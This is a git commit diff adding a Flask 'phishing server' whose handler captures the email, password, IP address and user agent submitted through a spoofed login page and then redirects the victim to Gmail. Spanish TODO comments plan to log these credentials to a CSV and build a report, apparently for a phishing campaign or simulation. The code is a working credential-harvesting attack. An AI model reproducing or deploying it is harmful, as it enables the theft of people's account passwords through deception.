d1cd3dfe7bd625ec037394a1df6f400b3f241abb
B0rjitaaa <bmcx12@gmail.com>
2018-08-31 21:37:24 +0200

    Phishing server with Falsk.

--- code/app.py
+++ code/app.py
@@ -5,19 +5,22 @@ app = Flask(__name__)
 
 
 @app.route('/', methods=['GET', 'POST'])
-def hello_world():
+def phishing_server():
     target = sys.argv[1]
     if request.method == 'POST':
         email = request.form['email']
         passwd = request.form['password']
-        import ipdb; ipdb.set_trace()
         ip_addr = request.remote_addr
         user_agent = request.user_agent
 
+        # TODO: todos estos cmapos se vana  meter en un CSV.
+        # este CSV va a contener ip, email, passw, navegador....
+        # además una fase o stage, por ejemplo si se ha llegado hasta aqí es que el se ha saltado
+        # varias protecciones... pues eso también hay que pònerlo para cuando se genere el informe.
         # redirect a donde toque
         return redirect("https://www.gmail.com", code=302)
     return render_template(target, name='index')
 
 if __name__ == '__main__':
-    app.run(debug=True,host='0.0.0.0')
-    # app.run(host='0.0.0.0', port='80')
+    app.run(host='0.0.0.0', port='80')
+    # app.run(host='0.0.0.0', port='80')ddde
